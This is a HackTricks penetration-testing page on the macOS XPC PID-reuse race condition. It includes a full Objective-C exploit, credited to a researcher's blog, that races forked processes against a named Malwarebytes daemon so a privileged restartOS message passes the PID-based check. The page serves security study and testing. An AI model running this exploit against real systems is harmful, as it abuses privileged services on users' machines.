# macOS PID Reuse

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## PID Reuse

When a macOS **XPC service** is checking the called process based on the **PID** and not on the **audit token**, it's vulnerable to PID reuse attack. This attack is based on a **race condition** where an **exploit** is going to **send messages to the XPC** service **abusing** the functionality and just **after** that, executing **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** with the **allowed** binary.

This function will make the **allowed binary own the PID** but the **malicious XPC message would have been sent** just before. So, if the **XPC** service **use** the **PID** to **authenticate** the sender and checks it **AFTER** the execution of **`posix_spawn`**, it will think it comes from an **authorized** process.

### Exploit example

If you find the function **`shouldAcceptNewConnection`** or a function called by it **calling** **`processIdentifier`** and not calling **`auditToken`**. It highly probable means that it's v**erifying the process PID** and not the audit token.\
Like for example in this image (taken from the reference):

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

Check this example exploit (again, taken from the reference) to see the 2 parts of the exploit:

* One that **generates several forks**
* **Each fork** will **send** the **payload** to the XPC service while executing **`posix_spawn`** just after sending the message.

{% hint style="danger" %}
For the exploit to work it's important to export export OBJC\_DISABLE\_INITIALIZE\_FORK\_SAFETY=YES or to put in th exploit:

```objectivec
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");
```
{% endhint %}

```objectivec
// from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

    // send the XPC messages
    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
    xpcConnection.remoteObjectInterface = remoteInterface;

    [xpcConnection resume];
    [xpcConnection.remoteObjectProxy restartOS];

    char target_binary[] = BINARY;
    char *target_argv[] = {target_binary, NULL};
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags;
    posix_spawnattr_getflags(&attr, &flags);
    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
    posix_spawnattr_setflags(&attr, flags);
    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

    NSString *exec = [[NSBundle mainBundle] executablePath];
    NSTask *processes[RACE_COUNT];

    for (int i = 0; i < RACE_COUNT; i++) {
        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
    }

    int i = 0;
    struct timespec ts = {
        .tv_sec = 0,
        .tv_nsec = 500 * 1000000,
    };

    nanosleep(&ts, NULL);
    if (++i > 4) {
        for (int i = 0; i < RACE_COUNT; i++) {
            [processes[i] terminate];
        }
        return false;
    }

    return true;
}

int main(int argc, const char * argv[]) {

    if(argc > 1) {
        // called from the NSTasks
        child();

    } else {
        NSLog(@"Starting the race");
        create_nstasks();
    }

    return 0;
}obj
```

## Refereces

* [https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
* [https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf](https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
